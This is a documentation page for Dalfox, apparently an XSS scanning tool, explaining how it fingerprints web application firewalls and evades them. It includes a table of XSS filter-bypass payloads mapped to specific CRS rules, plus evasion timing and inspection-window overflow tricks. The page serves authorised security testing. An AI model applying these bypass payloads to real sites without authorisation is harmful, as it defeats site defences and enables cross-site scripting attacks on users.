+++
title = "WAF Bypass"
description = "Detect WAFs automatically and apply per-WAF evasion strategies."
weight = 4
toc = true
+++

Most real targets sit behind a WAF. Dalfox fingerprints the WAF, then automatically chooses an evasion strategy: extra encoders and payload mutations tuned to that specific WAF's rules.

## How it works

1. Dalfox sends a small set of **fingerprint probes** to the target.
2. If a known WAF signature shows up (headers like `cf-ray`, body markers like "Attention required!", or a 429/403 shape), Dalfox notes the WAF and its confidence.
3. The scanner merges the WAF's **extra encoders** into your encoder list and adds the WAF's **mutation list** to the payload generator.
4. Payload mutations are capped (4 variants per base payload) so request volume stays sane. The cap only applies once a WAF is detected, so the extra effort lands exactly on the scans that need it.

This is all on by default. You only touch flags if you want to disable or steer it.

## Supported WAFs

- Cloudflare
- AWS WAF
- Akamai
- Imperva / Incapsula
- ModSecurity
- OWASP CRS
- Sucuri
- F5 BIG-IP
- Barracuda
- FortiWeb
- Azure WAF
- Google Cloud Armor
- Fastly
- Wordfence

Unrecognised WAFs trigger a generic fallback strategy.

## Tuning the behaviour

### Auto (default)

```bash
dalfox https://target.app
# equivalent to:
dalfox https://target.app --waf-bypass auto
```

### Force a specific WAF

Skip fingerprinting and apply a chosen WAF's strategy directly:

```bash
dalfox https://target.app \
  --waf-bypass force \
  --force-waf cloudflare
```

Handy when the WAF masks its headers or sits behind a CDN.

### Disable WAF logic

```bash
dalfox https://target.app --waf-bypass off
```

No extra encoders, no mutations: just your configured payloads.

### Skip the probe

```bash
dalfox https://target.app --skip-waf-probe
```

Still uses header-based passive detection, but no provocation requests. Use when the target is flaky and you don't want to burn rate limit on a probe.

### Evasion throttle

When a WAF is detected, `--waf-evasion` switches Dalfox to **adaptive timing** instead of a blunt slowdown: it randomizes the inter-request interval (jitter) so the cadence can't be fingerprinted, and escalates a cooldown pause whenever it sees a cluster of blocked responses (403/406/429/503). The per-WAF pacing hint is also applied automatically on detection, even without the flag.

```bash
dalfox https://target.app --waf-evasion
```

For a hard ceiling on the request rate — independent of WAF detection and shared across **all** workers and targets — combine it with `--rate-limit` (requests/second). This is the right knob when scanning behind a shared IP or against an edge WAF with a global threshold, since `--delay` only spaces a single worker:

```bash
# At most 15 requests/second across the whole scan, with adaptive evasion
dalfox https://target.app --rate-limit 15 --waf-evasion
```

Transient failures (5xx, timeouts, connection resets) can be retried with `--retries` / `--retry-delay`; HTTP 429 is always retried with `Retry-After` honored.

### Filter weak fingerprints

Each fingerprint carries a confidence score (0.0–1.0). Generic markers like `Request blocked` (0.3) or `Server: Google Frontend` (0.15) sometimes false-positive on benign origins. Use `--waf-min-confidence` to discard anything below the threshold:

```bash
# Keep only confident matches (drops 0.3/0.15 noise)
dalfox https://target.app --waf-min-confidence 0.7
```

Default is `0.3` (suppresses weak/generic matches like `Server: Google Frontend`). Pass `--waf-min-confidence 0.0` to keep every match, or raise it when you suspect noisy passive detection is steering Dalfox into the wrong evasion strategy.

## Mutation tactics (under the hood)

Different WAFs fall to different tricks. A small sample:

| Mutation | Example | Works against |
|----------|---------|---------------|
| **HTML comment split** | `<scr<!---->ipt>` | Signature regex |
| **JS comment split** | `al/**/ert(1)` | Keyword filters |
| **Backtick call** | `` alert`1` `` | `alert(` regex |
| **Constructor chain** | `[].constructor.constructor('alert(1)')()` | Heavy keyword blocks |
| **Unicode JS escape** | `alert(1)` | JS-token filters |
| **Slash separator** | `<svg/onload=alert(1)/class=x>` | CRS 941160 |
| **SVG animate** | `<svg><animate onbegin=alert(1) attributeName=x>` | CRS 941110 |
| **HTML entity parens** | `alert&#40;1&#41;` | CRS 941370 |
| **Exotic whitespace** | form-feed / vertical tab | CRS 941320 |
| **Case alternation** | `<ScRiPt>` | Case-sensitive rules |
| **zwsp insertion** | `al​ert(1)` | Lexer-based detection |
| **Keyword entity encode** | `onerror=&#97;lert(1)` | `alert`/handler keyword regex (attribute-decoded) |
| **Multi-slash** | `<img/src=x/onerror=alert(1)>` | Regexes anchored on `\s` between later attributes |
| **Scheme break** | `href=java&#9;script:alert(1)` | Literal `javascript:` scheme regex (URL-parser strips the TAB) |
| **Entity scheme** | `href=&#106;avascript:alert(1)` | Literal `javascript:` scheme regex (attribute-decoded) |

The last four exploit that the HTML tokenizer decodes character references **inside attribute values** before the URL parser or the event-handler JS compiler sees them. They fire only in attribute / event-handler / `javascript:`-URL context and are skipped for bare body text and `<script>`/`<style>` payloads, where no entity decoding happens.

You don't configure these directly; they're selected automatically per WAF. To inspect what's happening, run with `--debug`.

## Inspection-window overflow

Some WAFs (e.g. AWS WAF-style configs) only inspect the **first N bytes** of a parameter value. A vector at the start of the value trips a block, but the same vector reflects untouched once it's pushed past the inspected window.

During active probing, when a parameter's special-character probe comes back fully blocked, Dalfox re-tries it behind a long benign filler prefix. If the characters now reflect, it concludes the value sits behind a size-limited inspection window and automatically prepends that filler to every payload for the parameter — so the real vector always lands past the window. The reported PoC URL includes the filler, so it reproduces as-is. This is automatic; nothing to configure.

## Combining with encoders

Your `--encoders` list and the WAF's extra encoders are merged. So this:

```bash
dalfox https://target.app -e url,base64
# Cloudflare detected → extra encoders: unicode, zwsp
# Effective: url, base64, unicode, zwsp
```

De-duplicates automatically, preserves order.

## Rate limiting & backoff

Dalfox tracks consecutive WAF blocks and automatically backs off with exponential sleep to avoid permanent blocks. You can help it along with `--delay` (per-request ms) and smaller `--workers` for fragile targets.

```bash
dalfox https://target.app --delay 500 --workers 10
```

## Debugging

Turn on the debug stream to see fingerprint decisions and the active strategy:

```bash
dalfox --debug https://target.app 2>&1 | grep -i waf
```

## Next

- [Stored XSS](../stored-xss/) covers the inject-here-verify-there pattern, which often interacts with WAFs.
- [Output &amp; Reports](../output/) for integrating findings into your pipeline.
